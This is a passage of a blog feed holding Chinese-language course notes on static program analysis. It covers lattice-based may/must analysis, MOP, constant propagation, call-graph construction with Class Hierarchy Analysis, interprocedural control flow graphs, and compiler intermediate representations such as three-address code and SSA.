的情形，即我们认为无到达定值，可对相关变量的存储空间进行替换。上界代表 safe but useless 的情况，即认为定值必然到达，但是这对我们寻找一个可替换掉的存储空间毫无意义。</p></li><li><p>而因为我们采用了 join 函数(并集)，那么我们必然会从 lattice 的最小下界往上走。而越往上走(相对于truth点而言)，我们就会失去更多的精确值。那么，在所有不动点中我们寻找最小不动点，那么就能得到精确值最大的结果。</p></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310221522165.png" alt="" /></p><h3 id="must"><a class="markdownIt-Anchor" href="#must"></a> MUST</h3><ul><li><p>在可用表达式分析中，下界代表无可用表达式，上界代表所有表达式都可用。</p></li><li><p>下界代表 safe but useless 的情形，因为需要重新计算每个表达式，就是确实有表达式可用。而上界代表 unsafe，因为不是所有路径都能使表达式都可用。与 may analysis 一样，通过寻找最大不动点，我们能得到合法的结果中精确值最大的结果。</p></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310221525983.png" alt="" /></p><h2 id="distributivity-and-mop"><a class="markdownIt-Anchor" href="#distributivity-and-mop"></a> Distributivity and MOP</h2><p>​与我们之前使用的算法不同，我们以前使用的算法是在运行过程中沿着数据流反复迭代的，而MOP是找出从开头到结尾所有路径，分别进行传递函数计算，最后将算完的所有路径进行 $\sqcup / \sqcap $ (即不是根据节点与其前驱/后继节点的关系来迭代计算数据流，而是直接查找所有路径，根据所有路径的计算结果综合在一起再取上/下界。这个结果是最理想的结果。)，公式如下：</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310221646821.png" alt="image-20231022164631766" /></p><p>​由于某些路径可能实际无法到达，因此MOP不是特别精确；而在正常的程序中路径过多，几乎无法全部枚举，因此MOP也不太实际。但是 MOP 比我们之前使用的迭代算法更精准</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>∨</mo><mi>F</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo>⪯</mo><mi>F</mi><mo stretchy="false">(</mo><mi>x</mi><mo>∨</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F(x)\lor F(y)\preceq F(x\lor y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⪯</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></span></p><p>​这里我理解前者就是每条路径不受影响的向下传递，每条路径都是算出最精确的结果然后最后进行汇总。而后者就是先对于输入进行约束(对于may/must的分析是一样的，may使用U，但是要求是多种情况，但是先合并后公式，合并那部分就只计算了一遍，而MOP则是计算了两遍，可能会多出额外的数据，然后再合并，精准度更高)，然后套用公式，在使用公式之前，精度就已经损耗了，然后继续往下传播损失更大。下面使用格也可以进行证明。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310221648079.png" alt="image-20231022164859036" /></p><p>​可以看到，迭代算法是 s3 对前驱取 join 后进行进行 f3 的转移，而 MOP 算法是对到达 s3 之后，s4 之前的路径结果取 join。</p><ul><li><p>那么迭代算法和 MOP 哪个更精确呢？我们可以证明，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>⊔</mo><mi>F</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo>⊑</mo><mi>F</mi><mo stretchy="false">(</mo><mi>x</mi><mo>⊔</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F(x)\sqcup F(y)\sqsubseteq F(x\sqcup y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊔</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊔</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>：</p></li><li><p>这表明 MOP 是更为精确的。但这并没有结束。而如果 F 是可分配的，那么确实可以让偏序符号改为等于号。恰好，gen/kill problem 下，F 确实可分配因此我们能确定，迭代算法的精度与 MOP 相等。</p></li></ul><h2 id="constant-propagation"><a class="markdownIt-Anchor" href="#constant-propagation"></a> Constant Propagation</h2><ul><li>这里可以直接参考 <a href="https://static-analysis.cuijiacai.com/04-dfa-fd/#_4-6-%E5%B8%B8%E9%87%8F%E4%BC%A0%E6%92%AD">这个博客</a></li></ul><p>​常量传播问题解决的主要就是确定一个程序点的变量x是不是常量的问题，如果是常量，那么之后就可以直接简化为常量进行处理了。这里主要涉及两方面的情况，一个是控制流的交汇，也就是说两个分支相同名称的数据同时传入，我这里需要把这个数据认定为什么，另一个是状态转移方程，给一个变量赋值，我怎么确定右侧的结果是一个常量还是别的东西。</p><p>​它这里主要是增加了对于数据流交汇和状态转移的处理</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402291938557.png" alt="image-20240229193802488" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402291938916.png" alt="image-20240229193816812" /></p><p>​再解决这两个之后，我们可以根据算法发现它是<strong>前向、Must</strong>的分析方法，因为常量的确定需要根据从上面传递的数值来判断，同时更换为常量不能存在错误，所以必须是必然性分析。</p><h2 id="worklist-algorithm"><a class="markdownIt-Anchor" href="#worklist-algorithm"></a> Worklist Algorithm</h2><p>​同时这里涉及工作表法，也就是将所有的BB条件到 Worklist 中，然后从头到尾抽取一个进行控制流交汇和状态转移方程，如果结果与之前的相同(transferNode来判断结果)，那么就直接进行下一个 BB 的分析，如果不同，则这个 BB 的下面的 BB 的输入值会改变，那么就会影响到输出，所以需要将后续节点继续加入到 Worklist 中继续分析。</p><h1 id="interprocedural-analysis"><a class="markdownIt-Anchor" href="#interprocedural-analysis"></a> Interprocedural Analysis</h1><p>​这里过程间分析只考虑值传递，指针传递在下一节。而过程间分析也就是考虑过程间(函数调用)的控制流，分析过程内的具体变化。</p><h2 id="call-graph"><a class="markdownIt-Anchor" href="#call-graph"></a> Call Graph</h2><h3 id="basic-concept"><a class="markdownIt-Anchor" href="#basic-concept"></a> Basic concept</h3><p>​调用图是程序中各过程(Procedure)之间调用关系的一种表示，考虑程序中的所有<strong>调用点</strong>(Call Site，调用表达式所在的语句)，所有的从调用点到 “<strong>目标方法(Target Method)</strong>——即被调用者(Callee)” 的边组成的集合为<strong>调用图(Call Graph)</strong></p><p>​对面向对象编程语言(Object-Oriented Programming Language，OOPL)的调用图构建，以Java为例，常见的方法有</p><ul><li>类层级结构分析(Class Hierarchy Analysis，CHA)</li><li>快速类型分析(Rapid Type Analysis，RTA)</li><li>变量类型分析(Variable Type Analysis，VTA)</li><li>指针分析(Pointer Analysis，k-CFA)</li></ul><p>上面的四种方法自上而下精度(Precision)越来越高，但是效率(Efficiency)也越来越低。这一章重点讲解类层级结构分析的方法，在后面几章里面会讲解指针分析的方法。</p><h3 id="method-call-in-java"><a class="markdownIt-Anchor" href="#method-call-in-java"></a> Method call in java</h3><table><thead><tr><th></th><th>静态调用(Static Call)</th><th>特殊调用(Special Call)</th><th>虚调用(Virtual Call)</th></tr></thead><tbody><tr><td><strong>指令</strong></td><td><code>invokestatic</code></td><td><code>invokespecial</code></td><td><code>invokeinterface</code> ， <code>invokevirtual</code></td></tr><tr><td><strong>接收对象(Receiver Object)</strong></td><td>无</td><td>有</td><td>有</td></tr><tr><td><strong>目标方法</strong></td><td>静态方法</td><td>构造函数，私有实例方法，基类实例方法</td><td>其他的实例方法</td></tr><tr><td><strong>目标方法数量</strong></td><td>1</td><td>1</td><td>≥1(多态-Polymorphism)</td></tr><tr><td><strong>决定时间(Determinacy)</strong></td><td>编译时</td><td>编译时</td><td>运行时</td></tr></tbody></table><p>​这里的调用其实是针对字节码的，也就是说在.class文件中可以看到不同方法的方法调用前缀，它主要用于JVM进行识别然后分情况进行处理。这里静态调用和特殊调用都是静态绑定的，也就是说每次的调用都是精准的，可以准确确定到具体的方法。但是虚调用实现的是 java 中的多态，对于某一个方法，他可能有很多重写方法(子类修改父类的方法，返回值和形参都不能改变)，同时因为实现多态的核心是向上转型，例如 <code>Parent p = new Child();</code>，所以具体运行中，要根据传递参数等上下文信息进行确定，所以它只能在运行时确定。而我们的之后的调用图就是要处理好虚调用，使用的 方法派发也是由 jvm 中对于虚调用的处理延申过来的。</p><h3 id="virtual-call-method-dispatch"><a class="markdownIt-Anchor" href="#virtual-call-method-dispatch"></a> Virtual call method dispatch</h3><ul><li>方法的描述符(Descriptor)：方法的<code>返回类型</code>和<code>形参类型</code>组成</li><li>方法的签名(Signature)：方法所在的<code>类名</code>，方法本身的<code>方法名</code>，和方法的<code>描述符</code>组成。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> &#123;<br>    T <span class="hljs-title function_">foo</span><span class="hljs-params">(P p, Q q, R r)</span> &#123; ... &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​上述方法的签名为 <code>&lt;C: T foo(P, Q, R)&gt;</code> ，其中 <code>C</code> 是类名， <code>T</code> 是返回类型， <code>(P, Q, R)</code> 是形参类型， <code>foo</code> 是方法名。在不产生歧义的前提下，方法签名可以简写为 <code>C.foo(P, Q, R)</code>，这里省略了返回类型，子类重写返回值和形参都不能改变，所以我认为使用其中一个条件就可以确定另外一个(容易混淆的重载，参数必定不同，返回类型无所谓，所以这里可以直接使用参数类型确定返回值)</p><p>​对于调用点 <code>o.foo()</code> 定义运行时刻解析调用点所调用的<strong>目标方法</strong>的过程为方法派发 <code>Dispatch(c,m)</code> ，其中 c 是接收对象的类型，m为方法签名。方法派发的过程简单理解就是从<strong>接收对象所在的类</strong>开始，按照<strong>从子类向到基类</strong>的顺序查找，直到找到一个方法名和描述符都相同的非抽象方法为止</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">foo</span><span class="hljs-params">()</span> &#123; ... &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span> &#123;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">foo</span><span class="hljs-params">()</span> &#123; ... &#125;<br>&#125;<br><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatch</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">A</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>    x.foo();<br>    <br>    <span class="hljs-type">A</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">C</span>();<br>    y.f00();<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>对于调用点 <code>x.foo()</code>，<code>Dispatch(B, A.foo()) = A.foo()</code></li><li>对于调用点 <code>y.f00()</code>，<code>Dispatch(C, A.f00()) = A.f00()</code></li></ul><p>​对于 <code>A x = new B();</code>，它的接收对象类型是 <code>B</code>。虽然 <code>x</code> 被声明为 <code>A</code> 类型，但实际上它被初始化为 <code>B</code> 类型的一个实例。因此，当调用 <code>x.foo();</code> 时，会调用 <code>B</code> 类型的 <code>foo</code> 方法。</p><h3 id="class-hierarchy-analysis"><a class="markdownIt-Anchor" href="#class-hierarchy-analysis"></a> Class Hierarchy Analysis</h3><p>​这是一种算法，它是指通过查找类的层级结构来解析目标方法的过程，被称为 <code>Resolve</code>。使用到了 <code>Dispatch</code> 的方法。</p><ul><li>CHA需要知道整个程序的类之间的继承关系，也就是层级结构</li><li>CHA会根据调用点处的<strong>接收变量(Receiver Variable)</strong> 的 <strong>声明类型(Declare Type)</strong> 来解析虚调用</li><li>CHA假设声明类型为 <code>A</code> 的接收变量 <code>a</code> 可能会指向 <code>A</code> 类以及 <code>A</code> 的所有 <strong>子类(Subclass)</strong> 的对象</li></ul><p>​CHA的调用解析算法处理虚调用的方式是暴力的枚举，将变量<strong>声明类型</strong>及其子类中所有和调用点处<strong>签名匹配的方法</strong>都视为可能的目标方法。这里需要注意区分 Dispatch 和 Resolve 对于父子类的不同寻找方向。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403090952016.png" alt="image-20240309095232919" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">foo</span><span class="hljs-params">()</span> &#123; ... &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span> &#123; &#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">foo</span><span class="hljs-params">()</span> &#123; ... &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">D</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">foo</span><span class="hljs-params">()</span> &#123; ... &#125;<br>&#125;<br><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">resolve</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">C</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> ...;<br>    c.foo();<br>    <br>    <span class="hljs-type">A</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> ...;<br>    a.foo();<br>    <br>    <span class="hljs-type">B</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">B</span>();<br>    b.foo();<br>&#125;<br></code></pre></td></tr></table></figure><p>​算法会对于每一个接收变量的<strong>声明类型本身及其子类</strong>关于调用点处的<strong>函数签名</strong>进行<strong>方法派发</strong>的操作，将所有找到的目标方法加入结果之中</p><ul><li><code>Resolve(c.foo()) = &#123;C.foo()&#125;</code><ul><li>virtual call，首先匹配声明类型C，对于它本身和每一个子类(C没有子类)进行遍历，这里遍历之后只有C类本身。然后 Dispatch(C, c.foo())，Dispatch从子类C到父类A进行寻找，发现C中存在匹配方法，匹配结束，得到 C.foo()</li></ul></li><li><code>Resolve(a.foo()) = &#123;A.foo(), C.foo(), D.foo()&#125;</code><ul><li>virtual call，首先匹配声明类型A，对于它本身和每一个子类遍历，得到A，B，C，D。然后 Dispatch(A, a.foo())得到 A.foo()；Dispatch(B, a.foo())从子类到基类，得到 A.foo()；Dispatch(C, a.foo()) 在C类中匹配到方法，得到 C.foo()；Dispatch(D, a.foo()) 从D类中匹配到方法，得到 D.foo()</li></ul></li><li><code>Resolve(b.foo()) = &#123;A.foo(), C.foo(), D.foo()&#125;</code><ul><li>virtual call，声明类型B，对于本身及子类遍历，得到B，C，D，然后Dispatch(B, b.foo())从子类到基类，匹配到 A.foo()方法；Dispatch(C, b.foo())，匹配到C类，Dispatch(D, b.foo())匹配到D类。</li><li>同时CHA的Resolve算法只关心声明类型，所以 <code>new B()</code> 没有作用</li></ul></li><li>IDEA使用CHA算法分析目标调用</li></ul><p>总结：<code>Dispatch </code>是<strong>从本身开始查找方法实现，如果没有找到，则继续向父类索引</strong>; 而对于在 CHA 中的 <code>Call Resolution</code> 算法而言, 对于 <code>virtual call</code> 需要对<strong>它本身和它所有的子类及其子类的子类</strong>都调用 <code>Dispatch</code>，然后根据 Dispatch 的规则，找到第一个符合条件的即可。</p><h2 id="interprocedural-control-flow-graph"><a class="markdownIt-Anchor" href="#interprocedural-control-flow-graph"></a> Interprocedural Control Flow Graph</h2><p>​过程间控制流图(ICFG)由CFG边，调用边和返回边构成。即 <code>ICFG = CFG + call &amp; return edges</code> ，而 <code>CFG Edges = Call-to-return Edges + Normal Edges</code>。这里 Call-to-return Edges 就是为了传递无需进入调用的方法内部(比如说除了参数以外的其他变量的信息)的信息，可以直接从外面的这条边传递，提高效率。</p><h2 id="intraprocedural-data-flow-analysis"><a class="markdownIt-Anchor" href="#intraprocedural-data-flow-analysis"></a> Intraprocedural Data-Flow Analysis</h2><p>​它主要是两方面的状态转移方程，边转移和结点转移(边转移就包含了之前的交汇，结点转移包含之前的转移方程)</p><p>边转移</p><ul><li><strong>普通边转移(Normal Edge Transfer)</strong>：数据流沿着某个方法的CFG中的边的转移函数；</li><li><strong>调用-返回边转移(Call-Return Edge Transfer)</strong>：数据流从调用点沿着调用-返回边到返回点的转移函数；</li><li><strong>调用边转移(Call Edge Transfer)</strong>：数据流从调用点(见定义5.3)沿着调用边转移到被调用者的入口结点的转移函数；</li><li><strong>返回边转移(Return Edge Transfer)</strong>：数据流从被调用者的出口结点沿着返回边转移到返回点(见定义5.8)的转移函数。</li></ul><p>结点转移</p><ul><li><strong>调用结点转移(Call Node Transfer)</strong>：调用点对应的结点的状态转移方程；</li><li><strong>其他结点转移(Other Node Transfer)</strong>：调用点以外的其他结点的状态转移方程。</li></ul><h2 id="analyze-and-compare"><a class="markdownIt-Anchor" href="#analyze-and-compare"></a> Analyze and compare</h2><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">过程内数据流分析</th><th>过程间数据流分析</th></tr></thead><tbody><tr><td style="text-align:center"><strong>程序表示</strong></td><td style="text-align:center"><code>CFG</code></td><td><code>ICFG = CFGs + call &amp; return Edges</code></td></tr><tr><td style="text-align:center"><strong>转移函数</strong></td><td style="text-align:center">结点转移</td><td>结点转移 + 边转移</td></tr></tbody></table><ul><li>这里的结点转移就是之前 BB 内部的转移方程，然后meet操作被分解到边转移中，根据不同的情况调整不同的meet操作</li><li>这里需要区分一下 ICFG 与 IDFA 的区别，控制流是基础骨架, 而数据流是在骨架上的血肉</li></ul><p>​<strong>过程间控制流图(Interprocedural Control Flow Graph，ICFG)</strong></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310252003222.png" alt="image-20231025200307155" /></p><p>​<strong>过程内数据流分析(Intraprocedural Data-Flow Analysis，IDFA)</strong></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202310252003060.png" alt="image-20231025200324017" /></p>]]></content>
    
    
    <categories>
      
      <category>静态分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>《软件分析》_part1</title>
    <link href="/posts/4002e7c0.html"/>
    <url>/posts/4002e7c0.html</url>
    
    <content type="html"><![CDATA[<p>This is my curriculum understanding.</p><blockquote><p>Reference:</p><p><a href="https://blog.csdn.net/zhang971105/category_10471447.html">静态分析学习笔记</a></p><p><a href="https://ranger-nju.gitbook.io/static-program-analysis-book/">上课笔记</a></p></blockquote><h1 id="intermediate-representation"><a class="markdownIt-Anchor" href="#intermediate-representation"></a> Intermediate Representation</h1><h2 id="rice定理"><a class="markdownIt-Anchor" href="#rice定理"></a> Rice定理</h2><ul><li>对于使用 <strong>递归可枚举(Recursively Enumerable)</strong> 的语言描述的程序，其任何 <strong>非平凡(Non-trivial)</strong> 的性质都是无法完美确定的。<ul><li>关于递归可枚举，其含义是存在某个计算函数(可以是图灵机)，能够将这种语言中的所有合法字符串枚举出来。目前我们所能想到的所有的编程语言都是递归可枚举语言。</li><li>关于非平凡，如果一种性质是所有的程序都满足的或者都不满足的，那么这种性质就是平凡的，除此之外的性质都是非平凡的。其实和程序运行时的行为相关的，让我们感兴趣的性质，基本都是非平凡的性质(可以理解为不确定的性质)。</li></ul></li></ul><h2 id="compilers-and-static-analyzers"><a class="markdownIt-Anchor" href="#compilers-and-static-analyzers"></a> Compilers and Static Analyzers</h2><p>编译器将源代码(<code>Source code</code>)转换为机器代码(<code>Machine Code</code>)。其中的流程框架如下</p><ul><li>此处也可以去延伸了解一下<a href="https://en.wikipedia.org/wiki/Chomsky_hierarchy">乔姆斯基体系</a>，包含了0型文法(对应递归可枚举语言，图灵机)、1型文法(对应上下文敏感语言)、2型文法(对应上下文无关语言)和3型文法(正则文法，有限状态机)</li></ul><h3 id="scanner"><a class="markdownIt-Anchor" href="#scanner"></a> Scanner</h3><ul><li><strong>词法分析器</strong>(<code>Scanner扫描器</code>)，结合正则表达式，通过词法分析(<code>Lexical Analysis</code>)将 source code 翻译为 token。<ul><li>这里就是根据语句的不同组成成分进行划分，例如划分出关键词，标识符等(由正则表达式进行匹配)，之后进提取形成一个标记(Token)串</li></ul></li></ul><h3 id="parser"><a class="markdownIt-Anchor" href="#parser"></a> Parser</h3><ul><li><strong>语法分析器</strong>(<code>Parser解析器</code>)，结合上下文无关文法(<code>Context-Free Grammar</code>)，通过语法分析(<code>Syntax Analysis</code>)，将 token 解析为抽象语法树(<code>Abstract Syntax Tree</code>, AST)。<ul><li>解析器内部应该是实现了一个有限状态机，用来识别和分析每个语法格式的正确性—这里解析器实现了token和语法规则的匹配(具体可以联系主谓宾的匹配，存在这种组合既可以通过，而不必考虑这句话的含义是否正确)</li><li>解析为抽象语法树----递归下降解析器等</li></ul></li></ul><h3 id="type-checker"><a class="markdownIt-Anchor" href="#type-checker"></a> Type Checker</h3><ul><li><strong>语义分析器</strong>(<code>Type Checker类型检查器</code>)，结合属性文法(<code>Attribute Grammar</code>)，通过语义分析(<code>Semantic Analysis</code>)，将 AST 解析为 decorated AST。<ul><li>这里语义分析主要就是对于变量声明和类型检查(例如INT与String进行相加)，作用域分析，类型推断(rust的推断功能)，错误检查等，然后生成一个抽象语法树</li><li>抽象语法树相比于语法树，包含了更多关于源代码语义的信息。普通的语法树主要表示了源代码的结构，但不包含关于标识符、数据类型、作用域等语义信息。</li></ul></li></ul><h3 id="translator"><a class="markdownIt-Anchor" href="#translator"></a> Translator</h3><ul><li><strong>翻译器</strong>(<code>Translator</code>)，会将抽象语法树翻译成中间表示(Intermediate Representation, IR)，IR 的出现解耦了编译器的机器相关(Machine Dependent)部分和机器无关(Machine Independent)部分，上述几个层次在不同架构的机器上面是可以几乎不加改动地复用的。Translator，将 decorated AST 翻译为生成<code>三地址码这样的中间表示形式</code>(<code>Intermediate Representation</code>, IR)，并<strong>基于 IR 做静态分析</strong>(例如代码优化这样的工作----下面提及的机器无关方面)。<ul><li><strong>编译器的结构</strong>：编译器通常包括两个主要部分：机器相关部分和机器无关部分。机器相关部分负责将源代码翻译成特定计算机体系结构的机器代码，而机器无关部分负责执行编程语言无关的分析和优化。机器相关部分需要根据不同的目标体系结构进行适应和修改，这可能是复杂且繁琐的工作。</li><li><strong>中间表示(IR)的作用</strong>：引入中间表示的目的是为了将机器相关和机器无关部分解耦。IR 是一种抽象的、与计算机体系结构无关的表示，它在编译器的不同阶段中用作数据结构，将源代码的语义信息转化成一种通用形式。这种中间表示有助于减少编译器的复杂性，使编译器的机器无关部分不需要依赖于特定的硬件体系结构。</li><li><strong>机器相关和机器无关的复用</strong>：由于IR是与硬件体系结构无关的通用表示，机器相关部分只需关注如何将IR翻译成目标机器的机器代码，而无需关心源代码的编程语言细节。这使得机器相关部分在不同的计算机体系结构上能够以几乎不加修改地复用。同时，机器无关部分也不需要知道目标机器的具体细节，因为它操作的是IR而不是直接的机器代码。</li><li>简单理解，在拥有翻译器之前<ul><li><code>机器相关</code>就是负责将中间表示(IR)翻译成目标机器的机器代码，处理与底层硬件相关的细节，以便将源代码转化为可在特定机器上执行的代码。</li><li><code>机器无关</code> 就是负责对中间表示(IR)进行分析和优化。这个部分独立于目标机器的体系结构，它执行编程语言无关的操作，如常量传播、死代码消除、循环优化等。机器无关部分的目标是提高源代码的性能、可读性和可维护性。</li></ul></li></ul></li></ul><h3 id="code-generator"><a class="markdownIt-Anchor" href="#code-generator"></a> Code Generator</h3><ul><li><strong>机器码生成器(Code Generator)</strong> 会将 IR 转化成物理 CPU 能够直接执行的比特序列，这个过程是<strong>机器相关的</strong>。</li></ul><h3 id="summarize"><a class="markdownIt-Anchor" href="#summarize"></a> summarize</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202311060905306.png" alt="image-20231106090527264" /></p><ul><li>这里的<code>e.g</code>为被剔除的语句</li></ul><h2 id="ir-three-address-code3ac"><a class="markdownIt-Anchor" href="#ir-three-address-code3ac"></a> IR: Three-Address Code(3AC)</h2><ul><li>3AC的要求:<ul><li>在一个指令的<code>右边至多</code>只有一个操作符</li><li>每个3AC指令<code>可以至多</code>包含三种地址：变量名(如a、b、c)，常量(如数字3)，编译器生成的临时变量(如t1)</li></ul></li><li>这里使用的是java–&gt;IR Jimple–&gt;有类型的三地址码(typed 3AC)</li><li>这里需要注意一下的是，无论是三地址码还是汇编，其指令类型不取决于具体的语言，而取决于运行这个语言的机器的指令集体系结构(Instruction Set Architecture，ISA)</li></ul><h2 id="static-single-assignment"><a class="markdownIt-Anchor" href="#static-single-assignment"></a> Static Single Assignment</h2><p>所谓静态单赋值(SSA)，就是让每次对变量x赋值都重新使用一个新的变量xi，并在后续使用中选择最新的变量。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">  <span class="hljs-number">3</span>AC         <span class="hljs-string">|         SSA</span><br>p = a + b     <span class="hljs-string">|     p1 = a + b</span><br>q = p - c     <span class="hljs-string">|     q1 = p1 - c</span><br>p = q * d     <span class="hljs-string">|     p2 = q1 * d</span><br>q = p + q     <span class="hljs-string">|     q2 = p2 + q1</span><br></code></pre></td></tr></table></figure><h3 id="why-use-ssa"><a class="markdownIt-Anchor" href="#why-use-ssa"></a> why use SSA</h3><ul><li>控制流信息间接地集成到了独特变量名中<ul><li>如果有些对控制流不敏感的简化分析，就可以借助于 SSA</li></ul></li><li>定义与使用是显式的<ul><li>更有效率的数据存取与传播，有些优化在基于 SSA 时效果更好(例如条件常量传播，全局变量编号等)</li></ul></li></ul><h3 id="why-not-use-ssa"><a class="markdownIt-Anchor" href="#why-not-use-ssa"></a> why not use SSA</h3><ul><li>SSA 会引入过多的变量和 <span class="katex"><span class="katex-mathml"><math 